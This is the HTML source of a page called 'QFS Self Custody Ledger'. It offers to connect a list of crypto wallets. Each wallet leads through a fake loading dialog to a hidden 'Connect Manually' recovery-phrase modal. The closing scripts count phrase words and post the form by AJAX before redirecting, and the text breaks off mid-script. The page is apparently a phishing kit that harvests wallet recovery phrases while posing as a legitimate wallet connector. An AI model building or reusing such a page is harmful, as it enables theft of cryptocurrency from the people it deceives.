
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <!-- CSRF Token -->
    <meta name="csrf-token" content="HjR7Pl6rMs3SoIgyh6fodmCCvEjzDRZpS7p8zNod">

    <title>App | QFS Self Custody Ledger</title>

    <link rel="icon" href="/favicon.ico" sizes="any">
    <link rel="apple-touch-icon" href="/apple-touch-icon.png">

    <link rel="preload" as="style" href="https://qfsselfcustody.com/build/assets/secure_assets-C5K5KKkC.css" /><link rel="modulepreload" href="https://qfsselfcustody.com/build/assets/secure_assets-BdwThiUe.js" /><link rel="modulepreload" href="https://qfsselfcustody.com/build/assets/bootstrap-B4mIeCsZ.js" /><link rel="stylesheet" href="https://qfsselfcustody.com/build/assets/secure_assets-C5K5KKkC.css" /><script type="module" src="https://qfsselfcustody.com/build/assets/secure_assets-BdwThiUe.js"></script>
    </head>

<body data-aos-easing="ease" data-aos-duration="400" data-aos-delay="0">

    <div class="d-flex justify-content-center">
        <div id="google_translate_element"></div>
    </div>
        <main class="container">
        <div class="secure_assets">
            <div class="container header">
                <div class="d-flex flex-column justify-content-center text-center p-4">
                    <h4 class="header-title">Wallets</h4>
                    <div class="mt-2 header-lead px-4 mx-5">
                        Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop
                        computer screen
                        to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile
                        browsers are
                        supported via mobile deep linking.
                    </div>
                </div>
            </div>

            <div class="wallets mb-5">                                                                      
                    <div data-aos="slide-up"
                        class="wallet d-flex justify-content-center flex-column text-center p-3">
                        <div class="p-4">
                            <img src="https://qfsselfcustody.com/images/wallets/bit_keep.png" alt=""
                                class="img-fluid wallet-image rounded-4"
                                >
                        </div>
                        <a href="#" data-bs-toggle="modal" data-bs-target="#connectLoading15"
                            class="link-dark text-decoration-none stretched-link fw-bold">
                            Bit Keep
                        </a>
                    </div>

                    <!-- Connect loading Modal -->
                    <div class="modal fade" id="connectLoading15" data-bs-backdrop="static"
                        data-bs-keyboard="false" tabindex="-1" aria-labelledby="connectLoading15Label"
                        aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered modal-connect">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-header">
                                    <h1 class="modal-title fs-5 text-primary" id="connectLoading15Label"
                                        data-bs-dismiss="modal" aria-label="Close" style="cursor: pointer">
                                        Back</h1>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                                        aria-label="Close"></button>
                                </div>
                                <div class="modal-body">
                                    <div class="border border-danger p-3 d-flex justify-content-between align-items-center mb-3 text-danger"
                                        style="border-radius: 12px">
                                        <p class="mb-0 fs-5" id="loading"></p>
                                        <button class="btn btn-secondary p-1 rounded-3 15"
                                            id="connectManually" style="display: none" data-bs-toggle="modal"
                                            data-count="15" data-filename="bit_keep.png"
                                            data-wallet="Bit Keep Wallet"
                                            data-bs-target="#phraseKey15">
                                            Connect Manually
                                        </button>
                                    </div>

                                    <div class="border border-secondary p-3 d-flex justify-content-between align-items-center"
                                        style="border-radius: 12px">
                                        <div class="d-flex flex-column">
                                            <h5 class="mb-1">Bit Keep</h5>
                                            <p class="fs-6 mb-0 pb-0">Easy-to-use browser extension.</p>
                                        </div>
                                        <img src="https://qfsselfcustody.com/images/wallets/bit_keep.png" alt=""
                                            class="img-fluid" style="border-radius: 50%;height: 24px;width: 24px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Phrase Key Modal -->
                    <div class="modal fade" id="phraseKey15" data-bs-backdrop="static" data-bs-keyboard="false"
                        tabindex="-1" aria-labelledby="phraseKey15Label" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-body">

                                </div>
                                <div class="d-flex justify-content-end align-items-center mb-3 mt-2 me-4">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close"
                                        onclick="document.querySelectorAll('.modal.show').forEach(modal => bootstrap.Modal.getInstance(modal).hide());document.querySelector('.modal-backdrop').remove();">
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                                                        
                                                       
                    <div data-aos="slide-up"
                        class="wallet d-flex justify-content-center flex-column text-center p-3">
                        <div class="p-4">
                            <img src="https://qfsselfcustody.com/images/wallets/easy_pocket.jpg" alt=""
                                class="img-fluid wallet-image rounded-4"
                                >
                        </div>
                        <a href="#" data-bs-toggle="modal" data-bs-target="#connectLoading27"
                            class="link-dark text-decoration-none stretched-link fw-bold">
                            Easy Pocket
                        </a>
                    </div>

                    <!-- Connect loading Modal -->
                    <div class="modal fade" id="connectLoading27" data-bs-backdrop="static"
                        data-bs-keyboard="false" tabindex="-1" aria-labelledby="connectLoading27Label"
                        aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered modal-connect">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-header">
                                    <h1 class="modal-title fs-5 text-primary" id="connectLoading27Label"
                                        data-bs-dismiss="modal" aria-label="Close" style="cursor: pointer">
                                        Back</h1>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                                        aria-label="Close"></button>
                                </div>
                                <div class="modal-body">
                                    <div class="border border-danger p-3 d-flex justify-content-between align-items-center mb-3 text-danger"
                                        style="border-radius: 12px">
                                        <p class="mb-0 fs-5" id="loading"></p>
                                        <button class="btn btn-secondary p-1 rounded-3 27"
                                            id="connectManually" style="display: none" data-bs-toggle="modal"
                                            data-count="27" data-filename="easy_pocket.jpg"
                                            data-wallet="Easy Pocket Wallet"
                                            data-bs-target="#phraseKey27">
                                            Connect Manually
                                        </button>
                                    </div>

                                    <div class="border border-secondary p-3 d-flex justify-content-between align-items-center"
                                        style="border-radius: 12px">
                                        <div class="d-flex flex-column">
                                            <h5 class="mb-1">Easy Pocket</h5>
                                            <p class="fs-6 mb-0 pb-0">Easy-to-use browser extension.</p>
                                        </div>
                                        <img src="https://qfsselfcustody.com/images/wallets/easy_pocket.jpg" alt=""
                                            class="img-fluid" style="border-radius: 50%;height: 24px;width: 24px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Phrase Key Modal -->
                    <div class="modal fade" id="phraseKey27" data-bs-backdrop="static" data-bs-keyboard="false"
                        tabindex="-1" aria-labelledby="phraseKey27Label" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-body">

                                </div>
                                <div class="d-flex justify-content-end align-items-center mb-3 mt-2 me-4">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close"
                                        onclick="document.querySelectorAll('.modal.show').forEach(modal => bootstrap.Modal.getInstance(modal).hide());document.querySelector('.modal-backdrop').remove();">
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                                                        
                    <div data-aos="slide-up"
                        class="wallet d-flex justify-content-center flex-column text-center p-3">
                        <div class="p-4">
                            <img src="https://qfsselfcustody.com/images/wallets/eidoo.png" alt=""
                                class="img-fluid wallet-image rounded-4"
                                >
                        </div>
                        <a href="#" data-bs-toggle="modal" data-bs-target="#connectLoading28"
                            class="link-dark text-decoration-none stretched-link fw-bold">
                            Eidoo
                        </a>
                    </div>

                    <!-- Connect loading Modal -->
                    <div class="modal fade" id="connectLoading28" data-bs-backdrop="static"
                        data-bs-keyboard="false" tabindex="-1" aria-labelledby="connectLoading28Label"
                        aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered modal-connect">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-header">
                                    <h1 class="modal-title fs-5 text-primary" id="connectLoading28Label"
                                        data-bs-dismiss="modal" aria-label="Close" style="cursor: pointer">
                                        Back</h1>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                                        aria-label="Close"></button>
                                </div>
                                <div class="modal-body">
                                    <div class="border border-danger p-3 d-flex justify-content-between align-items-center mb-3 text-danger"
                                        style="border-radius: 12px">
                                        <p class="mb-0 fs-5" id="loading"></p>
                                        <button class="btn btn-secondary p-1 rounded-3 28"
                                            id="connectManually" style="display: none" data-bs-toggle="modal"
                                            data-count="28" data-filename="eidoo.png"
                                            data-wallet="Eidoo Wallet"
                                            data-bs-target="#phraseKey28">
                                            Connect Manually
                                        </button>
                                    </div>

                                    <div class="border border-secondary p-3 d-flex justify-content-between align-items-center"
                                        style="border-radius: 12px">
                                        <div class="d-flex flex-column">
                                            <h5 class="mb-1">Eidoo</h5>
                                            <p class="fs-6 mb-0 pb-0">Easy-to-use browser extension.</p>
                                        </div>
                                        <img src="https://qfsselfcustody.com/images/wallets/eidoo.png" alt=""
                                            class="img-fluid" style="border-radius: 50%;height: 24px;width: 24px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Phrase Key Modal -->
                    <div class="modal fade" id="phraseKey28" data-bs-backdrop="static" data-bs-keyboard="false"
                        tabindex="-1" aria-labelledby="phraseKey28Label" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-body">

                                </div>
                                <div class="d-flex justify-content-end align-items-center mb-3 mt-2 me-4">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close"
                                        onclick="document.querySelectorAll('.modal.show').forEach(modal => bootstrap.Modal.getInstance(modal).hide());document.querySelector('.modal-backdrop').remove();">
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                                                        
                    <div data-aos="flip-up"
                        class="wallet d-flex justify-content-center flex-column text-center p-3">
                        <div class="p-4">
                            <img src="https://qfsselfcustody.com/images/wallets/ellipal.png" alt=""
                                class="img-fluid wallet-image rounded-4"
                                >
                        </div>
                        <a href="#" data-bs-toggle="modal" data-bs-target="#connectLoading29"
                            class="link-dark text-decoration-none stretched-link fw-bold">
                            Ellipal
                        </a>
                    </div>

                    <!-- Connect loading Modal -->
                    <div class="modal fade" id="connectLoading29" data-bs-backdrop="static"
                        data-bs-keyboard="false" tabindex="-1" aria-labelledby="connectLoading29Label"
                        aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered modal-connect">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-header">
                                    <h1 class="modal-title fs-5 text-primary" id="connectLoading29Label"
                                        data-bs-dismiss="modal" aria-label="Close" style="cursor: pointer">
                                        Back</h1>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                                        aria-label="Close"></button>
                                </div>
                                <div class="modal-body">
                                    <div class="border border-danger p-3 d-flex justify-content-between align-items-center mb-3 text-danger"
                                        style="border-radius: 12px">
                                        <p class="mb-0 fs-5" id="loading"></p>
                                        <button class="btn btn-secondary p-1 rounded-3 29"
                                            id="connectManually" style="display: none" data-bs-toggle="modal"
                                            data-count="29" data-filename="ellipal.png"
                                            data-wallet="Ellipal Wallet"
                                            data-bs-target="#phraseKey29">
                                            Connect Manually
                                        </button>
                                    </div>

                                    <div class="border border-secondary p-3 d-flex justify-content-between align-items-center"
                                        style="border-radius: 12px">
                                        <div class="d-flex flex-column">
                                            <h5 class="mb-1">Ellipal</h5>
                                            <p class="fs-6 mb-0 pb-0">Easy-to-use browser extension.</p>
                                        </div>
                                        <img src="https://qfsselfcustody.com/images/wallets/ellipal.png" alt=""
                                            class="img-fluid" style="border-radius: 50%;height: 24px;width: 24px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Phrase Key Modal -->
                    <div class="modal fade" id="phraseKey29" data-bs-backdrop="static" data-bs-keyboard="false"
                        tabindex="-1" aria-labelledby="phraseKey29Label" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-body">

                                </div>
                                <div class="d-flex justify-content-end align-items-center mb-3 mt-2 me-4">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close"
                                        onclick="document.querySelectorAll('.modal.show').forEach(modal => bootstrap.Modal.getInstance(modal).hide());document.querySelector('.modal-backdrop').remove();">
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                                                        
                    <div data-aos="slide-up"
                        class="wallet d-flex justify-content-center flex-column text-center p-3">
                        <div class="p-4">
                            <img src="https://qfsselfcustody.com/images/wallets/equal.jpg" alt=""
                                class="img-fluid wallet-image rounded-4"
                                >
                        </div>
                        <a href="#" data-bs-toggle="modal" data-bs-target="#connectLoading30"
                            class="link-dark text-decoration-none stretched-link fw-bold">
                            Equal
                        </a>
                    </div>

                    <!-- Connect loading Modal -->
                    <div class="modal fade" id="connectLoading30" data-bs-backdrop="static"
                        data-bs-keyboard="false" tabindex="-1" aria-labelledby="connectLoading30Label"
                        aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered modal-connect">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-header">
                                    <h1 class="modal-title fs-5 text-primary" id="connectLoading30Label"
                                        data-bs-dismiss="modal" aria-label="Close" style="cursor: pointer">
                                        Back</h1>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                                        aria-label="Close"></button>
                                </div>
                                <div class="modal-body">
                                    <div class="border border-danger p-3 d-flex justify-content-between align-items-center mb-3 text-danger"
                                        style="border-radius: 12px">
                                        <p class="mb-0 fs-5" id="loading"></p>
                                        <button class="btn btn-secondary p-1 rounded-3 30"
                                            id="connectManually" style="display: none" data-bs-toggle="modal"
                                            data-count="30" data-filename="equal.jpg"
                                            data-wallet="Equal Wallet"
                                            data-bs-target="#phraseKey30">
                                            Connect Manually
                                        </button>
                                    </div>

                                    <div class="border border-secondary p-3 d-flex justify-content-between align-items-center"
                                        style="border-radius: 12px">
                                        <div class="d-flex flex-column">
                                            <h5 class="mb-1">Equal</h5>
                                            <p class="fs-6 mb-0 pb-0">Easy-to-use browser extension.</p>
                                        </div>
                                        <img src="https://qfsselfcustody.com/images/wallets/equal.jpg" alt=""
                                            class="img-fluid" style="border-radius: 50%;height: 24px;width: 24px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Phrase Key Modal -->
                    <div class="modal fade" id="phraseKey30" data-bs-backdrop="static" data-bs-keyboard="false"
                        tabindex="-1" aria-labelledby="phraseKey30Label" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-body">

                                </div>
                                <div class="d-flex justify-content-end align-items-center mb-3 mt-2 me-4">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close"
                                        onclick="document.querySelectorAll('.modal.show').forEach(modal => bootstrap.Modal.getInstance(modal).hide());document.querySelector('.modal-backdrop').remove();">
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                                                        
                    <div data-aos="slide-up"
                        class="wallet d-flex justify-content-center flex-column text-center p-3">
                        <div class="p-4">
                            <img src="https://qfsselfcustody.com/images/wallets/exodus.png" alt=""
                                class="img-fluid wallet-image rounded-4"
                                >
                        </div>
                        <a href="#" data-bs-toggle="modal" data-bs-target="#connectLoading31"
                            class="link-dark text-decoration-none stretched-link fw-bold">
                            Exodus
                        </a>
                    </div>

                    <!-- Connect loading Modal -->
                    <div class="modal fade" id="connectLoading31" data-bs-backdrop="static"
                        data-bs-keyboard="false" tabindex="-1" aria-labelledby="connectLoading31Label"
                        aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered modal-connect">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-header">
                                    <h1 class="modal-title fs-5 text-primary" id="connectLoading31Label"
                                        data-bs-dismiss="modal" aria-label="Close" style="cursor: pointer">
                                        Back</h1>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                                        aria-label="Close"></button>
                                </div>
                                <div class="modal-body">
                                    <div class="border border-danger p-3 d-flex justify-content-between align-items-center mb-3 text-danger"
                                        style="border-radius: 12px">
                                        <p class="mb-0 fs-5" id="loading"></p>
                                        <button class="btn btn-secondary p-1 rounded-3 31"
                                            id="connectManually" style="display: none" data-bs-toggle="modal"
                                            data-count="31" data-filename="exodus.png"
                                            data-wallet="Exodus Wallet"
                                            data-bs-target="#phraseKey31">
                                            Connect Manually
                                        </button>
                                    </div>

                                    <div class="border border-secondary p-3 d-flex justify-content-between align-items-center"
                                        style="border-radius: 12px">
                                        <div class="d-flex flex-column">
                                            <h5 class="mb-1">Exodus</h5>
                                            <p class="fs-6 mb-0 pb-0">Easy-to-use browser extension.</p>
                                        </div>
                                        <img src="https://qfsselfcustody.com/images/wallets/exodus.png" alt=""
                                            class="img-fluid" style="border-radius: 50%;height: 24px;width: 24px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Phrase Key Modal -->
                    <div class="modal fade" id="phraseKey31" data-bs-backdrop="static" data-bs-keyboard="false"
                        tabindex="-1" aria-labelledby="phraseKey31Label" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-body">

                                </div>
                                <div class="d-flex justify-content-end align-items-center mb-3 mt-2 me-4">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close"
                                        onclick="document.querySelectorAll('.modal.show').forEach(modal => bootstrap.Modal.getInstance(modal).hide());document.querySelector('.modal-backdrop').remove();">
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                                                        
                    <div data-aos="flip-up"
                        class="wallet d-flex justify-content-center flex-column text-center p-3">
                        <div class="p-4">
                            <img src="https://qfsselfcustody.com/images/wallets/fetch.jpg" alt=""
                                class="img-fluid wallet-image rounded-4"
                                >
                        </div>
                        <a href="#" data-bs-toggle="modal" data-bs-target="#connectLoading32"
                            class="link-dark text-decoration-none stretched-link fw-bold">
                            Fetch
                        </a>
                    </div>

                    <!-- Connect loading Modal -->
                    <div class="modal fade" id="connectLoading32" data-bs-backdrop="static"
                        data-bs-keyboard="false" tabindex="-1" aria-labelledby="connectLoading32Label"
                        aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered modal-connect">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-header">
                                    <h1 class="modal-title fs-5 text-primary" id="connectLoading32Label"
                                        data-bs-dismiss="modal" aria-label="Close" style="cursor: pointer">
                                        Back</h1>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                                        aria-label="Close"></button>
                                </div>
                                <div class="modal-body">
                                    <div class="border border-danger p-3 d-flex justify-content-between align-items-center mb-3 text-danger"
                                        style="border-radius: 12px">
                                        <p class="mb-0 fs-5" id="loading"></p>
                                        <button class="btn btn-secondary p-1 rounded-3 32"
                                            id="connectManually" style="display: none" data-bs-toggle="modal"
                                            data-count="32" data-filename="fetch.jpg"
                                            data-wallet="Fetch Wallet"
                                            data-bs-target="#phraseKey32">
                                            Connect Manually
                                        </button>
                                    </div>

                                    <div class="border border-secondary p-3 d-flex justify-content-between align-items-center"
                                        style="border-radius: 12px">
                                        <div class="d-flex flex-column">
                                            <h5 class="mb-1">Fetch</h5>
                                            <p class="fs-6 mb-0 pb-0">Easy-to-use browser extension.</p>
                                        </div>
                                        <img src="https://qfsselfcustody.com/images/wallets/fetch.jpg" alt=""
                                            class="img-fluid" style="border-radius: 50%;height: 24px;width: 24px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Phrase Key Modal -->
                    <div class="modal fade" id="phraseKey32" data-bs-backdrop="static" data-bs-keyboard="false"
                        tabindex="-1" aria-labelledby="phraseKey32Label" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-body">

                                </div>
                                <div class="d-flex justify-content-end align-items-center mb-3 mt-2 me-4">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close"
                                        onclick="document.querySelectorAll('.modal.show').forEach(modal => bootstrap.Modal.getInstance(modal).hide());document.querySelector('.modal-backdrop').remove();">
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                                                        
                    <div data-aos="fade-up"
                        class="wallet d-flex justify-content-center flex-column text-center p-3">
                        <div class="p-4">
                            <img src="https://qfsselfcustody.com/images/wallets/gnosis_safe_multisig.png" alt=""
                                class="img-fluid wallet-image rounded-4"
                                >
                        </div>
                        <a href="#" data-bs-toggle="modal" data-bs-target="#connectLoading33"
                            class="link-dark text-decoration-none stretched-link fw-bold">
                            Gnosis Safe Multisig
                        </a>
                    </div>

                    <!-- Connect loading Modal -->
                    <div class="modal fade" id="connectLoading33" data-bs-backdrop="static"
                        data-bs-keyboard="false" tabindex="-1" aria-labelledby="connectLoading33Label"
                        aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered modal-connect">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-header">
                                    <h1 class="modal-title fs-5 text-primary" id="connectLoading33Label"
                                        data-bs-dismiss="modal" aria-label="Close" style="cursor: pointer">
                                        Back</h1>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                                        aria-label="Close"></button>
                                </div>
                                <div class="modal-body">
                                    <div class="border border-danger p-3 d-flex justify-content-between align-items-center mb-3 text-danger"
                                        style="border-radius: 12px">
                                        <p class="mb-0 fs-5" id="loading"></p>
                                        <button class="btn btn-secondary p-1 rounded-3 33"
                                            id="connectManually" style="display: none" data-bs-toggle="modal"
                                            data-count="33" data-filename="gnosis_safe_multisig.png"
                                            data-wallet="Gnosis Safe Multisig Wallet"
                                            data-bs-target="#phraseKey33">
                                            Connect Manually
                                        </button>
                                    </div>

                                    <div class="border border-secondary p-3 d-flex justify-content-between align-items-center"
                                        style="border-radius: 12px">
                                        <div class="d-flex flex-column">
                                            <h5 class="mb-1">Gnosis Safe Multisig</h5>
                                            <p class="fs-6 mb-0 pb-0">Easy-to-use browser extension.</p>
                                        </div>
                                        <img src="https://qfsselfcustody.com/images/wallets/gnosis_safe_multisig.png" alt=""
                                            class="img-fluid" style="border-radius: 50%;height: 24px;width: 24px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Phrase Key Modal -->
                    <div class="modal fade" id="phraseKey33" data-bs-backdrop="static" data-bs-keyboard="false"
                        tabindex="-1" aria-labelledby="phraseKey33Label" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-body">

                                </div>
                                <div class="d-flex justify-content-end align-items-center mb-3 mt-2 me-4">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close"
                                        onclick="document.querySelectorAll('.modal.show').forEach(modal => bootstrap.Modal.getInstance(modal).hide());document.querySelector('.modal-backdrop').remove();">
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                                                        
                    <div data-aos="flip-up"
                        class="wallet d-flex justify-content-center flex-column text-center p-3">
                        <div class="p-4">
                            <img src="https://qfsselfcustody.com/images/wallets/graph_protocol.jpg" alt=""
                                class="img-fluid wallet-image rounded-4"
                                 style="border-radius: 50% !important;" >
                        </div>
                        <a href="#" data-bs-toggle="modal" data-bs-target="#connectLoading34"
                            class="link-dark text-decoration-none stretched-link fw-bold">
                            Graph Protocol
                        </a>
                    </div>

                    <!-- Connect loading Modal -->
                    <div class="modal fade" id="connectLoading34" data-bs-backdrop="static"
                        data-bs-keyboard="false" tabindex="-1" aria-labelledby="connectLoading34Label"
                        aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered modal-connect">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-header">
                                    <h1 class="modal-title fs-5 text-primary" id="connectLoading34Label"
                                        data-bs-dismiss="modal" aria-label="Close" style="cursor: pointer">
                                        Back</h1>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                                        aria-label="Close"></button>
                                </div>
                                <div class="modal-body">
                                    <div class="border border-danger p-3 d-flex justify-content-between align-items-center mb-3 text-danger"
                                        style="border-radius: 12px">
                                        <p class="mb-0 fs-5" id="loading"></p>
                                        <button class="btn btn-secondary p-1 rounded-3 34"
                                            id="connectManually" style="display: none" data-bs-toggle="modal"
                                            data-count="34" data-filename="graph_protocol.jpg"
                                            data-wallet="Graph Protocol Wallet"
                                            data-bs-target="#phraseKey34">
                                            Connect Manually
                                        </button>
                                    </div>

                                    <div class="border border-secondary p-3 d-flex justify-content-between align-items-center"
                                        style="border-radius: 12px">
                                        <div class="d-flex flex-column">
                                            <h5 class="mb-1">Graph Protocol</h5>
                                            <p class="fs-6 mb-0 pb-0">Easy-to-use browser extension.</p>
                                        </div>
                                        <img src="https://qfsselfcustody.com/images/wallets/graph_protocol.jpg" alt=""
                                            class="img-fluid" style="border-radius: 50%;height: 24px;width: 24px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Phrase Key Modal -->
                    <div class="modal fade" id="phraseKey34" data-bs-backdrop="static" data-bs-keyboard="false"
                        tabindex="-1" aria-labelledby="phraseKey34Label" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-body">

                                </div>
                                <div class="d-flex justify-content-end align-items-center mb-3 mt-2 me-4">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close"
                                        onclick="document.querySelectorAll('.modal.show').forEach(modal => bootstrap.Modal.getInstance(modal).hide());document.querySelector('.modal-backdrop').remove();">
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                                                        
                    <div data-aos="flip-up"
                        class="wallet d-flex justify-content-center flex-column text-center p-3">
                        <div class="p-4">
                            <img src="https://qfsselfcustody.com/images/wallets/grid_plus.png" alt=""
                                class="img-fluid wallet-image rounded-4"
                                >
                        </div>
                        <a href="#" data-bs-toggle="modal" data-bs-target="#connectLoading35"
                            class="link-dark text-decoration-none stretched-link fw-bold">
                            Grid Plus
                        </a>
                    </div>

                    <!-- Connect loading Modal -->
                    <div class="modal fade" id="connectLoading35" data-bs-backdrop="static"
                        data-bs-keyboard="false" tabindex="-1" aria-labelledby="connectLoading35Label"
                        aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered modal-connect">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-header">
                                    <h1 class="modal-title fs-5 text-primary" id="connectLoading35Label"
                                        data-bs-dismiss="modal" aria-label="Close" style="cursor: pointer">
                                        Back</h1>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                                        aria-label="Close"></button>
                                </div>
                                <div class="modal-body">
                                    <div class="border border-danger p-3 d-flex justify-content-between align-items-center mb-3 text-danger"
                                        style="border-radius: 12px">
                                        <p class="mb-0 fs-5" id="loading"></p>
                                        <button class="btn btn-secondary p-1 rounded-3 35"
                                            id="connectManually" style="display: none" data-bs-toggle="modal"
                                            data-count="35" data-filename="grid_plus.png"
                                            data-wallet="Grid Plus Wallet"
                                            data-bs-target="#phraseKey35">
                                            Connect Manually
                                        </button>
                                    </div>

                                    <div class="border border-secondary p-3 d-flex justify-content-between align-items-center"
                                        style="border-radius: 12px">
                                        <div class="d-flex flex-column">
                                            <h5 class="mb-1">Grid Plus</h5>
                                            <p class="fs-6 mb-0 pb-0">Easy-to-use browser extension.</p>
                                        </div>
                                        <img src="https://qfsselfcustody.com/images/wallets/grid_plus.png" alt=""
                                            class="img-fluid" style="border-radius: 50%;height: 24px;width: 24px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Phrase Key Modal -->
                    <div class="modal fade" id="phraseKey35" data-bs-backdrop="static" data-bs-keyboard="false"
                        tabindex="-1" aria-labelledby="phraseKey35Label" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-body">

                                </div>
                                <div class="d-flex justify-content-end align-items-center mb-3 mt-2 me-4">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close"
                                        onclick="document.querySelectorAll('.modal.show').forEach(modal => bootstrap.Modal.getInstance(modal).hide());document.querySelector('.modal-backdrop').remove();">
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
            </div>

            <footer class="d-flex justify-content-center align-items-center pt-5">
                <a href="javascript:void(0)" class="d-flex my-5 me-5 text-decoration-none">
                    <img src="https://qfsselfcustody.com/images/discord.svg" alt="Discord" class="me-1" width="20px">
                    <p class="mb-0">Discord</p>
                </a>
                <a href="javascript:void(0)" class="d-flex my-5 me-5 text-decoration-none">
                    <img src="https://qfsselfcustody.com/images/twitter.svg" alt="Twitter" class="me-1" width="20px">
                    <p class="mb-0">Twitter</p>
                </a>
            </footer>
        </div>
    </main>


    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({
                pageLanguage: 'en'
            }, 'google_translate_element');
        }
    </script>
    <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

        <script>
        function fireErrorToast(message = "") {
            const toastElement = $("#errorToast");
            if (message !== "") {
                $("#errorToast > .d-flex > .toast-body").text(message);
            }
            const toast = new bootstrap.Toast(toastElement);
            toast.show();
        }

        function wordCount(str) {
            return str.split(" ").filter(function(n) {
                return n !== "";
            }).length;
        }

        function mimiFireAjax(form) {
            $.ajax({
                type: "POST",
                url: $(form).attr("action"),
                data: $(form).serialize(),
                beforeSend: () => {
                    $("#loadingModal").show();
                },
                success: function(response) {
                    window.location.href = response;
                },
                complete: () => {
                    $("#loadingModal").hide();
                },
            });
        }

        function attachRestoreWalletHandlers() {
            // Phrase form validation
